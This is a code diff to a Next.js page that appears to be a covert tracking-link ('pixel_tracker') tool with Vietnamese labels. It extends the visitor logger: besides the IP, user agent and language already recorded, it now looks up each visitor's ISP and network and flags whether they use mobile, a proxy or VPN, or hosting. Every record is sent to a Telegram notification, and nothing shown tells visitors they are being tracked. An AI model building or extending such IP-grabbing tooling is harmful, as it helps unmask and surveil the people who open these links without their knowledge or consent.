@@ -4,7 +4,7 @@ import { notFound } from 'next/navigation';
 import { headers } from 'next/headers';
 import fs from 'fs';
 import path from 'path';
-import { sendTelegramNotification } from '@/lib/server-utils';
+import { getAddressFromIp, sendTelegramNotification } from '@/lib/server-utils';
 
 async function logAccess(linkId: string, title: string, imageUrl: string) {
     const headersList = headers();
@@ -14,11 +14,20 @@ async function logAccess(linkId: string, title: string, imageUrl: string) {
     const language = headersList.get('accept-language')?.split(',')[0];
     const timestamp = new Date().toISOString();
     
-    // Using a different source to distinguish in logs
+    const ipInfo = await getAddressFromIp(finalIp);
+    const ispDetails = [ipInfo.isp, ipInfo.org, ipInfo.as].filter(Boolean).join(' - ');
+    const ipFlags = [
+        ipInfo.mobile ? 'Mobile' : null,
+        ipInfo.proxy ? 'Proxy/VPN' : null,
+        ipInfo.hosting ? 'Hosting' : null,
+    ].filter(Boolean).join(', ');
+
     let logData = `--- [${timestamp}] MỚI TRUY CẬP ---\n`;
     logData += `Nguồn: pixel_tracker\n`;
     logData += `Thiết bị: ${ua}\n`;
     logData += `Địa chỉ IP: ${finalIp}\n`;
+    if (ispDetails) logData += `ISP: ${ispDetails}\n`;
+    if (ipFlags) logData += `Loại IP: ${ipFlags}\n`;
     logData += `Ngôn ngữ: ${language || 'N/A'}\n`;
     logData += `Múi giờ: N/A\n`;
     logData += `Tọa độ: N/A\n`;
@@ -39,6 +48,8 @@ async function logAccess(linkId: string, title: string, imageUrl: string) {
     telegramMessage += `*Tiêu đề:* \`${title}\`\n`;
     telegramMessage += `*Thời gian:* \`${new Date(timestamp).toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}\`\n`;
     telegramMessage += `*Địa chỉ IP:* \`${finalIp}\`\n`;
+    if (ispDetails) telegramMessage += `*ISP:* \`${ispDetails}\`\n`;
+    if (ipFlags) telegramMessage += `*Loại IP:* \`${ipFlags}\`\n`;
     telegramMessage += `*Ảnh được trả về:* ${imageUrl}\n`;
     
     sendTelegramNotification(telegramMessage);
